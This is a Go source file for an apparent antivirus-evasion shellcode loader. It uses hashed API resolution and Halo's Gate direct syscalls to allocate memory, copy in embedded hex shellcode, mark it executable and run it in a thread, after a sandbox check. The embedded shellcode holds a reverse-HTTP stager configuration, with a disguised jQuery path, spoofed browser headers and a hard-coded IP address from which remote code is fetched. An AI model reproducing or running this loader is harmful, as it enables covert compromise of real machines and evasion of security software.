package main

import (
	"GolangBypassAV/sandbox"
	"crypto/sha1"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"syscall"
	"unsafe"

	gabh "github.com/timwhitez/Doge-Gabh/pkg/Gabh"
)

/**

光环之门，hash调用，sysid

地狱之门的一个补丁，并不是所有函数都被hook住。利用旁边未被hook的函数算出sysid然后重建id进行脱钩
https://blog.sektor7.net/#!res/2021/halosgate.md
*/

func main() {
	sandbox.Check()
	sc, _ := hex.DecodeString("fc4883e4f0e8c8000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b0275728b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94fffffff5d6a0049be77696e696e65740041564989e64c89f141ba4c772607ffd54831c94831d24d31c04d31c94150415041ba3a5679a7ffd5e9930000005a4889c141b8fb2000004d31c9415141516a03415141ba57899fc6ffd5eb795b4889c14831d24989d84d31c952680032c084525241baeb552e3bffd54889c64883c3506a0a5f4889f1ba1f0000006a0068803300004989e041b90400000041ba75469e86ffd54889f14889da49c7c0ffffffff4d31c9525241ba2d06187bffd585c00f859d01000048ffcf0f848c010000ebb3e9e4010000e882ffffff2f6a71756572792d332e332e322e736c696d2e6d696e2e6a7300354f2150254041505b345c505a58353428505e2937434329377d2445494341522d5354414e444152442d414e544956495255532d54004163636570743a20746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b786d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c2a2f2a3b713d302e380d0a4163636570742d4c616e67756167653a20656e2d55532c656e3b713d302e350d0a526566657265723a20687474703a2f2f636f64652e6a71756572792e636f6d2f0d0a4163636570742d456e636f64696e673a20677a69702c206465666c6174650d0a557365722d4167656e743a204d6f7a696c6c612f352e30202857696e646f7773204e542031302e303b2057696e36343b2078363429204170706c655765624b69742f3533372e333620284b48544d4c2c206c696b65204765636b6f29204368726f6d652f38362e302e343234302e313938205361666172692f3533372e33360d0a00350041bef0b5a256ffd54831c9ba0000400041b80010000041b94000000041ba58a453e5ffd5489353534889e74889f14889da41b8002000004989f941ba129689e2ffd54883c42085c074b6668b074801c385c075d75858584805af0f000050c3e87ffdffff3130332e3234322e3133332e35350000000000")
	var thisThread = uintptr(0xffffffffffffffff)
	//从内存加载，得到sysid
	alloc, e := gabh.MemHgate(str2sha1("NtAllocateVirtualMemory"), str2sha1)
	if e != nil {
		panic(e)
	}
	//从磁盘加载
	protect, e := gabh.DiskHgate(Sha256Hex("NtProtectVirtualMemory"), Sha256Hex)
	if e != nil {
		panic(e)
	}
	createthread, e := gabh.MemHgate(Sha256Hex("NtCreateThreadEx"), Sha256Hex)
	if e != nil {
		panic(e)
	}
	pWaitForSingleObject, _, e := gabh.GetFuncPtr("kernel32.dll", str2sha1("WaitForSingleObject"), str2sha1)
	if e != nil {
		panic(e)
	}
	createThread(sc, thisThread, alloc, protect, createthread, pWaitForSingleObject)
}

func createThread(sc []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16, pWaitForSingleObject uint64) {

	const (
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)

	var baseA uintptr
	regionsize := uintptr(len(sc))
	r1, r := gabh.HgSyscall(
		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_READWRITE,
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	//copy shellcode
	memcpy(baseA, sc)

	var oldprotect uintptr
	r1, r = gabh.HgSyscall(
		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
	var hhosthread uintptr
	r1, r = gabh.HgSyscall(
		NtCreateThreadExSysid,                //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		handle,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	syscall.Syscall(uintptr(pWaitForSingleObject), 2, handle, 0xffffffff, 0)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
}

func memcpy(base uintptr, buf []byte) {
	for i := 0; i < len(buf); i++ {
		*(*byte)(unsafe.Pointer(base + uintptr(i))) = buf[i]
	}
}

func str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}

func Sha256Hex(s string) string {
	return hex.EncodeToString(Sha256([]byte(s)))
}

func Sha256(data []byte) []byte {
	digest := sha256.New()
	digest.Write(data)
	return digest.Sum(nil)
}
